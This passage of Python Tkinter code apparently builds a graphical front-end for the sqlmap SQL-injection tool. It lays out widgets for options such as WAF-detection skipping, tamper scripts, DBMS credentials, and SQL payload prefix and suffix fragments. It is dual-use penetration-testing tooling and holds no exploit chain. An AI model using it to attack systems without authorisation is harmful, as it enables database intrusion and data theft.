        self.e_output_dir.grid(row=5, column=1, sticky='we')
        # --save=SAVECONFIG   Save options to a configuration INI file
        self.chk_save = ttk.Checkbutton(gen_file_lf)
        self.chk_Save_var = tkinter.StringVar()
        self.chk_save.config(text="save", variable=self.chk_Save_var, onvalue="on",
                             offvalue="off", command=self.f_save)
        self.chk_save.grid(row=5, column=2, sticky='w', ipadx=15)
        #
        self.var_save_config = tkinter.StringVar()
        self.e_save_config = ttk.Entry(gen_file_lf, width=20)
        self.e_save_config.config(text="", textvariable=self.var_save_config)
        self.e_save_config.grid(row=5, column=3, sticky='we')
        # --scope=SCOPE       Regexp to filter targets from provided proxy log
        self.chk_scope = ttk.Checkbutton(gen_file_lf)
        self.chk_scope_var = tkinter.StringVar()
        self.chk_scope.config(text="scope", variable=self.chk_scope_var, onvalue="on",
                              offvalue="off", command=self.f_scope)
        self.chk_scope.grid(row=6, column=0, sticky='w', ipadx=15)
        #
        self.e_scope = ttk.Entry(gen_file_lf, width=20)
        self.e_scope.grid(row=6, column=1, sticky='we')
        # --har=HARFILE       Log all HTTP traffic into a HAR file
        self.chk_har = ttk.Checkbutton(gen_file_lf)
        self.chk_har_var = tkinter.StringVar()
        self.chk_har.config(text="har", variable=self.chk_har_var, onvalue="on",
                            offvalue="off", command=self.f_har)
        self.chk_har.grid(row=6, column=2, sticky='w', ipadx=15)
        #
        self.var_har_file = tkinter.StringVar()
        self.e_har = ttk.Entry(gen_file_lf, width=20)
        self.e_har.config(text="", textvariable=self.var_har_file)
        self.e_har.grid(row=6, column=3, sticky='we')
        # MISCELLANEOUS
        # https://github.com/sqlmapproject/sqlmap/commit/5650abbb4a1a35d7b51a53cb62e4f272a2fe69c5#diff-136d7f40c753ef8815a16d28370a9294
        miscellaneous_lf = ttk.Labelframe(settings_f, text='Miscellaneous')
        miscellaneous_lf.grid(row=6, sticky='we', columnspan=2, pady=10)
        # --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
        self.chk_skip_heuristics = ttk.Checkbutton(miscellaneous_lf)
        self.chk_skip_heuristics_var = tkinter.StringVar()
        self.chk_skip_heuristics.config(text="skip-heuristics", variable=self.chk_skip_heuristics_var, onvalue="on",
                                        offvalue="off", command=self.f_skip_heuristics)
        self.chk_skip_heuristics.grid(row=0, column=0, sticky='w')
        # --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
        self.chk_skip_waf = ttk.Checkbutton(miscellaneous_lf)
        self.chk_skip_waf_var = tkinter.StringVar()
        self.chk_skip_waf.config(text="skip-waf", variable=self.chk_skip_waf_var, onvalue="on",
                                 offvalue="off", command=self.f_skip_waf)
        self.chk_skip_waf.grid(row=1, column=0, sticky='w')
        # --offline           Work in offline mode (only use session data)
        self.chk_offline = ttk.Checkbutton(miscellaneous_lf)
        self.chk_offline_var = tkinter.StringVar()
        self.chk_offline.config(text="offline", variable=self.chk_offline_var, onvalue="on",
                                offvalue="off", command=self.f_offline)
        self.chk_offline.grid(row=2, column=0, sticky='w')
        # --smart             Conduct through tests only if positive heuristic(s)
        self.chk_smart = ttk.Checkbutton(miscellaneous_lf)
        self.chk_smart_var = tkinter.StringVar()
        self.chk_smart.config(text="smart", variable=self.chk_smart_var, onvalue="on",
                              offvalue="off", command=self.f_smart)
        self.chk_smart.grid(row=3, column=0, sticky='w')
        # --wizard            Simple wizard interface for beginner users
        self.chk_wizard = ttk.Checkbutton(miscellaneous_lf)
        self.chk_wizard_var = tkinter.StringVar()
        self.chk_wizard.config(text="wizard", variable=self.chk_wizard_var, onvalue="on",
                               offvalue="off", command=self.f_wizard)
        self.chk_wizard.grid(row=4, column=0, sticky='w')
        # --dummy
        self.chk_dummy = ttk.Checkbutton(miscellaneous_lf)
        self.chk_dummy_var = tkinter.StringVar()
        self.chk_dummy.config(text="dummy", variable=self.chk_dummy_var, onvalue="on",
                              offvalue="off", command=self.f_dummy)
        self.chk_dummy.grid(row=5, column=0, sticky='w')
        # --smoke-test
        self.chk_smoke_test = ttk.Checkbutton(miscellaneous_lf)
        self.chk_smoke_test_var = tkinter.StringVar()
        self.chk_smoke_test.config(text="smoke-test", variable=self.chk_smoke_test_var, onvalue="on",
                                   offvalue="off", command=self.f_smoke_test)
        self.chk_smoke_test.grid(row=6, column=0, sticky='w')
        # --dependencies      Check for missing sqlmap dependencies
        self.chk_dependencies = ttk.Checkbutton(miscellaneous_lf)
        self.chk_dependencies_var = tkinter.StringVar()
        self.chk_dependencies.config(text="dependencies", variable=self.chk_dependencies_var, onvalue="on",
                                     offvalue="off", command=self.f_dependencies)
        self.chk_dependencies.grid(row=0, column=1, sticky='w', ipadx=10)
        # --mobile            Imitate smartphone through HTTP User-Agent header
        self.chk_mobile = ttk.Checkbutton(miscellaneous_lf)
        self.chk_mobile_var = tkinter.StringVar()
        self.chk_mobile.config(text="mobile", variable=self.chk_mobile_var, onvalue="on",
                               offvalue="off", command=self.f_mobile)
        self.chk_mobile.grid(row=1, column=1, sticky='w')
        # --page-rank         Display page rank (PR) for Google dork results
        self.chk_page_rank = ttk.Checkbutton(miscellaneous_lf)
        self.chk_page_rank_var = tkinter.StringVar()
        self.chk_page_rank.config(text="page-rank", variable=self.chk_page_rank_var, onvalue="on",
                                  offvalue="off", command=self.f_page_rank)
        self.chk_page_rank.grid(row=2, column=1, sticky='w')
        # --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
        self.chk_cleanup = ttk.Checkbutton(miscellaneous_lf)
        self.chk_cleanup_var = tkinter.StringVar()
        self.chk_cleanup.config(text="cleanup", variable=self.chk_cleanup_var, onvalue="on",
                                offvalue="off", command=self.f_cleanup)
        self.chk_cleanup.grid(row=3, column=1, sticky='w')
        # --murphy-rate
        self.chk_murphy = ttk.Checkbutton(miscellaneous_lf)
        self.chk_murphy_rate_var = tkinter.StringVar()
        self.chk_murphy.config(text="murphy-rate", variable=self.chk_murphy_rate_var, onvalue="on",
                               offvalue="off", command=self.f_murphy_rate)
        self.chk_murphy.grid(row=4, column=1, sticky='w')
        # --live-test
        self.chk_live_test = ttk.Checkbutton(miscellaneous_lf)
        self.chk_live_test_var = tkinter.StringVar()
        self.chk_live_test.config(text="live-test", variable=self.chk_live_test_var, onvalue="on",
                                  offvalue="off", command=self.f_live_test)
        self.chk_live_test.grid(row=5, column=1, sticky='w')
        # --purge      Safely remove all content from output directory
        self.chk_purge = ttk.Checkbutton(miscellaneous_lf)
        self.chk_purge_var = tkinter.StringVar()
        self.chk_purge.config(text="purge", variable=self.chk_purge_var, onvalue="on",
                              offvalue="off", command=self.f_purge)
        self.chk_purge.grid(row=6, column=1, sticky='w', ipadx=10)
        # --base64     Parameter(s) containing Base64 encoded values
        self.chk_base64 = ttk.Checkbutton(miscellaneous_lf)
        self.chk_base64_var = tkinter.StringVar()
        self.chk_base64.config(text="base64", variable=self.chk_base64_var, onvalue="on",
                               offvalue="off", command=self.f_base64)
        self.chk_base64.grid(row=0, column=2, sticky='w')
        # --base64-safe    Use URL and filename safe Base64 alphabet
        # (Reference: https://en.wikipedia.org/wiki/Base64#URL_applications)
        self.chk_base64safe = ttk.Checkbutton(miscellaneous_lf)
        self.chk_base64safe_var = tkinter.StringVar()
        self.chk_base64safe.config(text='base64-safe', variable=self.chk_base64safe_var, onvalue="on",
                                   offvalue="off", command=self.f_base64safe)
        self.chk_base64safe.grid(row=1, column=2, sticky='w', ipadx=10)
        # --disable-coloring            Disable console output coloring
        self.chk_disable_coloring = ttk.Checkbutton(miscellaneous_lf)
        self.chk_disable_coloring_var = tkinter.StringVar()
        self.chk_disable_coloring.config(text="disable-coloring", variable=self.chk_disable_coloring_var, onvalue="on",
                                         offvalue="off", command=self.f_disable_coloring)
        self.chk_disable_coloring.grid(row=2, column=2, sticky='w')
        # --beep              Sound alert when SQL injection found
        self.chk_beep = ttk.Checkbutton(miscellaneous_lf)
        self.chk_beep_var = tkinter.StringVar()
        self.chk_beep.config(text="beep", variable=self.chk_beep_var, onvalue="on",
                             offvalue="off", command=self.f_beep)
        self.chk_beep.grid(row=3, column=2, sticky='w', ipadx=10)
        # --sqlmap-shell      Prompt for an interactive sqlmap shell
        self.chk_sqlmap_shell = ttk.Checkbutton(miscellaneous_lf)
        self.chk_sqlmap_shell_var = tkinter.StringVar()
        self.chk_sqlmap_shell.config(text="sqlmap-shell", variable=self.chk_sqlmap_shell_var, onvalue="on",
                                     offvalue="off", command=self.f_sqlmap_shell)
        self.chk_sqlmap_shell.grid(row=4, column=2, sticky='w')
        # --vuln-test
        self.chk_vuln_test = ttk.Checkbutton(miscellaneous_lf)
        self.chk_vuln_test_var = tkinter.StringVar()
        self.chk_vuln_test.config(text="vuln-test", variable=self.chk_vuln_test_var, onvalue="on",
                                  offvalue="off", command=self.f_vuln_test)
        self.chk_vuln_test.grid(row=5, column=2, sticky='w')
        # --web-root=WEBROOT    Web server document root directory (e.g. "/var/www")
        self.chk_web_root = ttk.Checkbutton(miscellaneous_lf)
        self.chk_web_root_var = tkinter.StringVar()
        self.chk_web_root.config(text="web-root", variable=self.chk_web_root_var, onvalue="on",
                                 offvalue="off", command=self.f_web_root)
        self.chk_web_root.grid(row=0, column=3, sticky='w')
        #
        self.e_web_root = ttk.Combobox(miscellaneous_lf)
        self.e_web_root_value = tkinter.StringVar()
        self.e_web_root.config(textvariable=self.e_web_root_value, state='disabled', width=10)
        self.e_web_root['values'] = ['/var/www/', '/home/www/', '/var/www/html/']
        self.e_web_root.current(0)
        self.e_web_root.bind('<<ComboboxSelected>>', self.f_web_root)
        self.e_web_root.grid(row=0, column=4, sticky='w', padx=5)
        # --gpage=GOOGLEPAGE  Use Google dork results from specified page number
        self.chk_gpage = ttk.Checkbutton(miscellaneous_lf)
        self.chk_gpage_var = tkinter.StringVar()
        self.chk_gpage.config(text="gpage", variable=self.chk_gpage_var, onvalue="on",
                              offvalue="off", command=self.f_gpage)
        self.chk_gpage.grid(row=1, column=3, sticky='w')
        #
        self.e_gpage = ttk.Entry(miscellaneous_lf, width=10)
        self.e_gpage.grid(row=1, column=4, sticky='w', padx=5)
        #
        # -z                  Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
        self.chk_z = ttk.Checkbutton(miscellaneous_lf)
        self.chk_z_var = tkinter.StringVar()
        self.chk_z.config(text="z", variable=self.chk_z_var, onvalue="on",
                          offvalue="off", command=self.f_z)
        self.chk_z.grid(row=2, column=3, sticky='w')
        #
        self.e_z = ttk.Entry(miscellaneous_lf, width=10)
        self.e_z.grid(row=2, column=4, sticky='w', padx=5)
        #
        # --tmp-dir=TMPDIR    Local directory for storing temporary files
        self.chk_tmp_dir = ttk.Checkbutton(miscellaneous_lf)
        self.chk_tmp_dir_var = tkinter.StringVar()
        self.chk_tmp_dir.config(text="tmp-dir", variable=self.chk_tmp_dir_var, onvalue="on",
                                offvalue="off", command=self.f_tmp_dir)
        self.chk_tmp_dir.grid(row=3, column=3, sticky='w')
        #
        self.e_tmp_dir = ttk.Entry(miscellaneous_lf, width=10)
        self.e_tmp_dir.grid(row=3, column=4, sticky='w', padx=5)
        #
        # --alert=ALERT       Run shell command(s) when SQL injection is found
        self.chk_alert = ttk.Checkbutton(miscellaneous_lf)
        self.chk_alert_var = tkinter.StringVar()
        self.chk_alert.config(text="alert", variable=self.chk_alert_var, onvalue="on",
                              offvalue="off", command=self.f_alert)
        self.chk_alert.grid(row=4, column=3, sticky='w')
        #
        self.e_alert = ttk.Entry(miscellaneous_lf, width=10)
        self.e_alert.grid(row=4, column=4, sticky='w', padx=5)
        #
        # --crack             Load and crack hashes from a file (standalone)
        self.chk_crack = ttk.Checkbutton(miscellaneous_lf)
        self.chk_crack_var = tkinter.StringVar()
        self.chk_crack.config(text="crack", variable=self.chk_crack_var, onvalue="on",
                              offvalue="off", command=self.f_crack)
        self.chk_crack.grid(row=5, column=3, sticky='w')
        #
        self.e_crack_var = tkinter.StringVar()
        self.e_crack = ttk.Entry(miscellaneous_lf, width=10)
        self.e_crack.config(text="", textvariable=self.e_crack_var)
        self.e_crack.grid(row=5, column=4, sticky='w', padx=5)
        #
        # --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
        self.chk_answers = ttk.Checkbutton(miscellaneous_lf)
        self.chk_answers_var = tkinter.StringVar()
        self.chk_answers.config(text="answers", variable=self.chk_answers_var, onvalue="on",
                                offvalue="off", command=self.f_answers)
        self.chk_answers.grid(row=0, column=5, sticky='w')
        #
        self.e_answers = ttk.Combobox(miscellaneous_lf)
        self.e_answers_value = tkinter.StringVar()
        self.e_answers.config(textvariable=self.e_answers_value, state='disabled', width=10)
        self.e_answers['values'] = ['process=Y']
        self.e_answers.current(0)
        self.e_answers.bind('<<ComboboxSelected>>', self.f_answers)
        self.e_answers.grid(row=0, column=6, sticky='we', padx=5)
        #
        # --stop-fail
        self.chk_stop_fail = ttk.Checkbutton(miscellaneous_lf)
        self.chk_stop_fail_var = tkinter.StringVar()
        self.chk_stop_fail.config(text="stop-fail", variable=self.chk_stop_fail_var, onvalue="on",
                                  offvalue="off", command=self.f_stop_fail)
        self.chk_stop_fail.grid(row=1, column=5, sticky='w')
        # --debug
        self.chk_debug = ttk.Checkbutton(miscellaneous_lf)
        self.chk_debug_var = tkinter.StringVar()
        self.chk_debug.config(text="debug", variable=self.chk_debug_var, onvalue="on",
                              offvalue="off", command=self.f_debug)
        self.chk_debug.grid(row=2, column=5, sticky='w')
        # --disable-stats
        self.chk_disable_stats = ttk.Checkbutton(miscellaneous_lf)
        self.chk_disable_stats_var = tkinter.StringVar()
        self.chk_disable_stats.config(text="disable-stats", variable=self.chk_disable_stats_var, onvalue="on",
                                      offvalue="off", command=self.f_disable_stats)
        self.chk_disable_stats.grid(row=3, column=5, sticky='w')
        # --profile
        self.chk_profile = ttk.Checkbutton(miscellaneous_lf)
        self.chk_profile_var = tkinter.StringVar()
        self.chk_profile.config(text="profile", variable=self.chk_profile_var, onvalue="on",
                                offvalue="off", command=self.f_profile)
        self.chk_profile.grid(row=4, column=5, sticky='w')
        # --run-case
        self.chk_run_case = ttk.Checkbutton(miscellaneous_lf)
        self.chk_run_case_var = tkinter.StringVar()
        self.chk_run_case.config(text="run-case", variable=self.chk_run_case_var, onvalue="on",
                                 offvalue="off", command=self.f_run_case)
        self.chk_run_case.grid(row=5, column=5, sticky='w')
        # --force-dbms
        self.chk_force_dbms = ttk.Checkbutton(miscellaneous_lf)
        self.chk_force_dbms_var = tkinter.StringVar()
        self.chk_force_dbms.config(text="force-dbms", variable=self.chk_force_dbms_var, onvalue="on",
                                   offvalue="off", command=self.f_force_dbms)
        self.chk_force_dbms.grid(row=1, column=6, sticky='w')
        # --force-dns
        self.chk_force_dns = ttk.Checkbutton(miscellaneous_lf)
        self.chk_force_dns_var = tkinter.StringVar()
        self.chk_force_dns.config(text="force-dns", variable=self.chk_force_dns_var, onvalue="on",
                                  offvalue="off", command=self.f_force_dns)
        self.chk_force_dns.grid(row=2, column=6, sticky='w')
        # --force-pivoting
        self.chk_force_pivoting = ttk.Checkbutton(miscellaneous_lf)
        self.chk_force_pivoting_var = tkinter.StringVar()
        self.chk_force_pivoting.config(text="force-pivoting", variable=self.chk_force_pivoting_var, onvalue="on",
                                       offvalue="off", command=self.f_force_pivoting)
        self.chk_force_pivoting.grid(row=3, column=6, sticky='w')
        # --unstable    If the target is unstable
        self.chk_unstable = ttk.Checkbutton(miscellaneous_lf)
        self.chk_unstable_var = tkinter.StringVar()
        self.chk_unstable.config(text="unstable", variable=self.chk_unstable_var, onvalue="on",
                                 offvalue="off", command=self.f_unstable)
        self.chk_unstable.grid(row=4, column=6, sticky='w')
        # --results-file    Location of CSV results file in multiple targets mode
        self.chk_result_file = ttk.Checkbutton(miscellaneous_lf)
        self.chk_result_file_var = tkinter.StringVar()
        self.chk_result_file.config(text="result-file", variable=self.chk_result_file_var, onvalue="on",
                                    offvalue="off", command=self.f_result_file)
        self.chk_result_file.grid(row=5, column=6, sticky='w')
        # OPTIMIZATIONS, FINGERPRINT, VERBOSE
        optimization_lf = ttk.Labelframe(settings_f, text='Optimizations, Fingerprint, Verbose')
        optimization_lf.grid(row=0, sticky='we', pady=10, columnspan=4)
        optimization_lf.columnconfigure(0, weight=1)
        #
        self.chk_optimization = ttk.Checkbutton(optimization_lf)
        self.chk_optimization_var = tkinter.StringVar()
        self.chk_optimization.config(text="o", variable=self.chk_optimization_var, onvalue="on",
                                     offvalue="off", command=self.f_optimization)
        self.chk_optimization.grid(row=0, column=0, sticky='wn', pady=1)
        # --predict-output    Predict common queries output
        self.chk_predict_output = ttk.Checkbutton(optimization_lf)
        self.chk_predict_output_var = tkinter.StringVar()
        self.chk_predict_output.config(text="predict-output", variable=self.chk_predict_output_var, onvalue="on",
                                       offvalue="off", command=self.f_predict_output)
        self.chk_predict_output.grid(row=0, column=1, sticky='w')
        # --keep-alive        Use persistent HTTP(s) connections
        self.chk_keep_alive = ttk.Checkbutton(optimization_lf)
        self.chk_keep_alive_var = tkinter.StringVar()
        self.chk_keep_alive.config(text="keep-alive", variable=self.chk_keep_alive_var, onvalue="on",
                                   offvalue="off", command=self.f_keep_alive)
        self.chk_keep_alive.grid(row=0, column=3, sticky='w')
        # --null-connection   Retrieve page length without actual HTTP response body
        self.chk_null_connection = ttk.Checkbutton(optimization_lf)
        self.chk_null_connection_var = tkinter.StringVar()
        self.chk_null_connection.config(text="null-connection", variable=self.chk_null_connection_var, onvalue="on",
                                        offvalue="off", command=self.f_null_connection)
        self.chk_null_connection.grid(row=0, column=4, sticky='w')
        # --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
        self.chk_threads = ttk.Checkbutton(optimization_lf)
        self.chk_threads_var = tkinter.StringVar()
        self.chk_threads.config(text="threads", variable=self.chk_threads_var, onvalue="on",
                                offvalue="off", command=self.f_threads)
        self.chk_threads.grid(row=0, column=5, sticky='w')
        self.threads = ttk.Combobox(optimization_lf)
        self.threads_value = tkinter.StringVar()
        self.threads.config(textvariable=self.threads_value, state='disable', width=3)
        self.threads['values'] = ('1', '2', '3', '4', '5', '6', '7', '8', '9', '10')
        self.threads.current(0)
        self.threads.bind('<<ComboboxSelected>>', self.f_threads)
        self.threads.grid(row=0, column=6, sticky='w', padx=5)
        # -f, --fingerprint   Perform an extensive DBMS version fingerprint
        self.chk_finger_print = ttk.Checkbutton(optimization_lf)
        self.chk_finger_print_var = tkinter.StringVar()
        self.chk_finger_print.config(text="fingerprint", variable=self.chk_finger_print_var, onvalue="on",
                                     offvalue="off", command=self.f_finger_print)
        self.chk_finger_print.grid(row=0, column=7, sticky='w')
        # -v VERBOSE            Verbosity level: 0-6 (default 1)
        self.chk_verbose = ttk.Checkbutton(optimization_lf)
        self.chk_verbose_var = tkinter.StringVar()
        self.chk_verbose.config(text="verbose", variable=self.chk_verbose_var, onvalue="on",
                                offvalue="off", command=self.f_verbose)
        self.chk_verbose.grid(row=0, column=8, sticky='w')
        self.e_verbose = ttk.Combobox(optimization_lf)
        self.e_verbose_value = tkinter.StringVar()
        self.e_verbose.config(textvariable=self.e_verbose_value, state='disabled', width=2)
        self.e_verbose['values'] = ('0', '1', '2', '3', '4', '5', '6')
        self.e_verbose.current(0)
        self.e_verbose.bind('<<ComboboxSelected>>', self.f_verbose)
        self.e_verbose.grid(row=0, column=9, sticky='w')
        # INJECTION | DETECTION | TECHNIQUE
        paned_i_t_o = ttk.Panedwindow(s_det_tech_f, orient=tkinter.HORIZONTAL)
        paned_i_t_o.rowconfigure(0, weight=1)
        paned_i_t_o.columnconfigure(0, weight=1)
        # INJECTION
        injection_lf = ttk.Labelframe(paned_i_t_o, text='Injection')
        injection_lf.rowconfigure(0, weight=1)
        injection_lf.columnconfigure(0, weight=1)
        # TAMPERS
        tampers_lf = ttk.Labelframe(paned_i_t_o, text='Tampers')
        tampers_lf.rowconfigure(0, weight=1)
        tampers_lf.columnconfigure(0, weight=1)
        #
        paned_i_t_o.add(injection_lf)
        paned_i_t_o.add(tampers_lf)
        paned_i_t_o.grid(row=0, column=0, pady=10, sticky='we')
        # --dbms=DBMS         Force back-end DBMS to this value
        self.chk_dbms = ttk.Checkbutton(injection_lf)
        self.chk_dbms_var = tkinter.StringVar()
        self.chk_dbms.config(text="dbms", variable=self.chk_dbms_var, onvalue="on",
                             offvalue="off", command=self.f_dbms)
        self.chk_dbms.grid(row=0, column=0, sticky='sw')
        #
        self.box = ttk.Combobox(injection_lf)
        self.box_value = tkinter.StringVar()
        self.box.config(textvariable=self.box_value, state='disabled', width=30)
        self.box['values'] = (
            'mysql', 'oracle', 'postgresql', 'mssqlserver', 'access', 'db2', 'sqlite', 'sqlite3', 'firebird', 'sybase',
            'maxdb', 'hsqldb', 'informix', 'h2', 'monetdb', 'derby', 'vertica', 'mckoi', 'presto', 'frontbase', 'cache',
            'cratedb', 'cubrid', 'altibase', 'mimersql', 'extremedb', 'virtuoso')
        self.box.current(0)
        self.box.bind('<<ComboboxSelected>>', self.f_dbms)
        self.box.grid(row=0, column=1, sticky='sw', padx=3)
        # --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
        self.chk_dbms_cred = ttk.Checkbutton(injection_lf)
        self.chk_dbms_cred_var = tkinter.StringVar()
        self.chk_dbms_cred.config(text="dbms-cred", variable=self.chk_dbms_cred_var, onvalue="on",
                                  offvalue="off", command=self.f_dbms_cred)
        self.chk_dbms_cred.grid(row=1, column=0, sticky='w')
        #
        self.e_dbms_cred = ttk.Combobox(injection_lf)
        self.e_dbms_cred_value = tkinter.StringVar()
        self.e_dbms_cred.config(textvariable=self.e_dbms_cred_value, state='disabled', width=30)
        self.e_dbms_cred['values'] = (
            'user:password')
        self.e_dbms_cred.current(0)
        self.e_dbms_cred.bind('<<ComboboxSelected>>', self.f_dbms_cred)
        self.e_dbms_cred.grid(row=1, column=1, sticky='we', padx=3)
        # -p TESTPARAMETER    Testable parameter(s)
        self.chk_test_parameter = ttk.Checkbutton(injection_lf)
        self.chk_test_parameter_var = tkinter.StringVar()
        self.chk_test_parameter.config(text="parameter", variable=self.chk_test_parameter_var, onvalue="on",
                                       offvalue="off", command=self.f_test_parameter)
        self.chk_test_parameter.grid(row=2, column=0, sticky='w')
        #
        self.e_test_parameter = ttk.Combobox(injection_lf)
        self.e_test_parameter_value = tkinter.StringVar()
        self.e_test_parameter.config(textvariable=self.e_test_parameter_value, state='disabled', width=30)
        self.e_test_parameter['values'] = (
            'Host', 'Cookie', 'User-Agent', 'Referer', 'X-Forwarded-For')
        self.e_test_parameter.current(0)
        self.e_test_parameter.bind('<<ComboboxSelected>>', self.f_test_parameter)
        self.e_test_parameter.grid(row=2, column=1, sticky='we', padx=3)
        # --param-exclude     Regexp to exclude parameters from testing (e.g. "ses")
        self.chk_param_exclude = ttk.Checkbutton(injection_lf)
        self.chkParam_exclude_var = tkinter.StringVar()
        self.chk_param_exclude.config(text="param-exclude", variable=self.chkParam_exclude_var, onvalue="on",
                                      offvalue="off", command=self.f_param_exclude)
        self.chk_param_exclude.grid(row=3, column=0, sticky='w')
        #
        self.entry_param_exclude = ttk.Entry(injection_lf)
        self.entry_param_exclude.grid(row=3, column=1, sticky='we', padx=3)
        # --prefix=PREFIX     Injection payload prefix string
        self.chk_prefix = ttk.Checkbutton(injection_lf)
        self.chk_prefix_var = tkinter.StringVar()
        self.chk_prefix.config(text="prefix", variable=self.chk_prefix_var, onvalue="on",
                               offvalue="off", command=self.f_prefix)
        self.chk_prefix.grid(row=4, column=0, sticky=tkinter.W)
        #
        self.e_prefix = ttk.Combobox(injection_lf)
        self.e_prefix_value = tkinter.StringVar()
        self.e_prefix.config(textvariable=self.e_prefix_value, state='disabled', width=30)
        self.e_prefix['values'] = ('-1')
        self.e_prefix.current(0)
        self.e_prefix.bind('<<ComboboxSelected>>', self.f_prefix)
        self.e_prefix.grid(row=4, column=1, sticky='we', padx=3)
        # --suffix=SUFFIX     Injection payload suffix string
        self.chk_suffix = ttk.Checkbutton(injection_lf)
        self.chk_suffix_var = tkinter.StringVar()
        self.chk_suffix.config(text="suffix", variable=self.chk_suffix_var, onvalue="on",
                               offvalue="off", command=self.f_suffix)
        self.chk_suffix.grid(row=5, column=0, sticky='w')
        #
        self.e_suffix = ttk.Combobox(injection_lf)
        self.e_suffix_value = tkinter.StringVar()
        self.e_suffix.config(textvariable=self.e_suffix_value, state='disabled', width=30)
        self.e_suffix['values'] = (')--')
        self.e_suffix.current(0)
        self.e_suffix.bind('<<ComboboxSelected>>', self.f_suffix)
        self.e_suffix.grid(row=5, column=1, sticky='we', padx=3)
        # --os=OS             Force back-end DBMS operating system to this value
        self.e_os = ttk.Combobox(injection_lf)
        self.e_os_value = tkinter.StringVar()
        self.e_os.config(textvariable=self.e_os_value, state='disabled', width=30)
        self.e_os['values'] = ('linux', 'windows')
        self.e_os.current(0)
        self.e_os.bind('<<ComboboxSelected>>', self.f_os)
        self.e_os.grid(row=6, column=1, sticky='we', padx=3)
        #
        self.chk_os = ttk.Checkbutton(injection_lf)
        self.chk_os_var = tkinter.StringVar()
        self.chk_os.config(text="OS", variable=self.chk_os_var, onvalue="on",
                           offvalue="off", command=self.f_os)
        self.chk_os.grid(row=6, column=0, sticky='w')
        # --skip=SKIP         Skip testing for given parameter(s)
        self.e_skip = ttk.Entry(injection_lf)
        self.e_skip.config(text="", textvariable="", width=30)
        self.e_skip.grid(row=7, column=1, sticky='we', padx=3)
        #
        self.chk_skip = ttk.Checkbutton(injection_lf)
        self.chk_skip_var = tkinter.StringVar()
        self.chk_skip.config(text="skip", variable=self.chk_skip_var, onvalue="on",
                             offvalue="off", command=self.f_skip)
        self.chk_skip.grid(row=7, column=0, sticky='w')
        #
        paned_inj = ttk.Panedwindow(injection_lf, orient=tkinter.HORIZONTAL)
        paned_inj.rowconfigure(0, weight=1)
        paned_inj.columnconfigure(0, weight=1)
        # add:
        chk_inj_lf = ttk.Labelframe(paned_inj, text='')
        chk_inj_lf.rowconfigure(0, weight=1)
        chk_inj_lf.columnconfigure(0, weight=1)
        #
        paned_inj.add(chk_inj_lf)
        paned_inj.grid(row=8, column=0, columnspan=2, sticky='we')
        # --invalid-logical   Use logical operations for invalidating values
        self.chk_invalid_logical = ttk.Checkbutton(chk_inj_lf)
        self.chk_invalid_logical_var = tkinter.StringVar()
        self.chk_invalid_logical.config(text="invalid-logical", variable=self.chk_invalid_logical_var, onvalue="on",
                                        offvalue="off", command=self.f_invalid_logical, width=14)
        self.chk_invalid_logical.grid(row=0, column=0, sticky='w')
        # --invalid-bignum    Use big numbers for invalidating values
        self.chk_invalid_bignum = ttk.Checkbutton(chk_inj_lf)
        self.chk_invalid_bignum_var = tkinter.StringVar()
        self.chk_invalid_bignum.config(text="invalid-bignum", variable=self.chk_invalid_bignum_var, onvalue="on",
                                       offvalue="off", command=self.f_invalid_bignum, width=14)
        self.chk_invalid_bignum.grid(row=0, column=1, sticky='w')
        # --no-cast           Turn off payload casting mechanism
        self.chk_no_cast = ttk.Checkbutton(chk_inj_lf)
        self.chk_no_cast_var = tkinter.StringVar()
        self.chk_no_cast.config(text="no-cast", variable=self.chk_no_cast_var, onvalue="on",
                                offvalue="off", command=self.f_no_cast)
        self.chk_no_cast.grid(row=0, column=2, sticky='w')
        # --no-escape         Turn off string escaping mechanism
        self.chk_no_escape = ttk.Checkbutton(chk_inj_lf)
        self.chk_no_escape_var = tkinter.StringVar()
        self.chk_no_escape.config(text="no-escape", variable=self.chk_no_escape_var, onvalue="on",
                                  offvalue="off", command=self.f_no_escape)
        self.chk_no_escape.grid(row=1, column=0, sticky='w')
        # --skip-static       Skip testing parameters that not appear dynamic
        self.chk_skip_static = ttk.Checkbutton(chk_inj_lf)
        self.chk_skip_static_var = tkinter.StringVar()
        self.chk_skip_static.config(text="skip-static", variable=self.chk_skip_static_var, onvalue="on",
                                    offvalue="off", command=self.chk_skip_static)
        self.chk_skip_static.grid(row=1, column=1, sticky='w')
        # --invalid-string    Use random strings for invalidating values
        self.chk_invalid_string = ttk.Checkbutton(chk_inj_lf)
        self.chk_invalid_string_var = tkinter.StringVar()
        self.chk_invalid_string.config(text='invalid-string', variable=self.chk_invalid_string_var, onvalue="on",
                                       offvalue="off", command=self.f_invalid_string)
        self.chk_invalid_string.grid(row=1, column=2, sticky='w')
        # --tamper=TAMPER     Use given script(s) for tampering injection data
        self.tamper = tkinter.Listbox(tampers_lf, height=9, width=10, selectmode=tkinter.EXTENDED)
        # *.py in listbox, exclude __init__.py
        files_tamper = os.listdir("./tamper")
        tampers = filter(lambda x: x.endswith('.py'), files_tamper)
        for tamp_list in sorted(tampers):
            if tamp_list not in "__init__.py":
                self.tamper.insert(tkinter.END, tamp_list)
        self.tamper.rowconfigure(0, weight=1)
        self.tamper.columnconfigure(0, weight=1)
        self.tamper.grid(row=0, column=0, padx=5, sticky='nswe')
        # Listbox - TAMPER SCROLL (Listed all tampers and get them scroll)
        scroll_tamper = ttk.Scrollbar(tampers_lf, orient=tkinter.VERTICAL, command=self.tamper.yview)
        self.tamper['yscrollcommand'] = scroll_tamper.set
        scroll_tamper.grid(row=0, column=1, sticky='ns')
        #
        paned_d_t_o = ttk.Panedwindow(s_det_tech_f, orient=tkinter.HORIZONTAL)
        paned_d_t_o.columnconfigure(0, weight=1)
        #
        detection_lf = ttk.Labelframe(paned_d_t_o, text='Detection')
        detection_lf.columnconfigure(0, weight=1)
        #
        technique_lf = ttk.Labelframe(paned_d_t_o, text='Technique')
        technique_lf.columnconfigure(0, weight=1)
        #
        paned_d_t_o.add(detection_lf)
        paned_d_t_o.add(technique_lf)
        paned_d_t_o.grid(row=1, column=0, columnspan=2, sticky='we', ipady=0)
        # --string=STRING     String to match when query is evaluated to True
        self.e_string = ttk.Combobox(detection_lf)
        self.e_string_value = tkinter.StringVar()
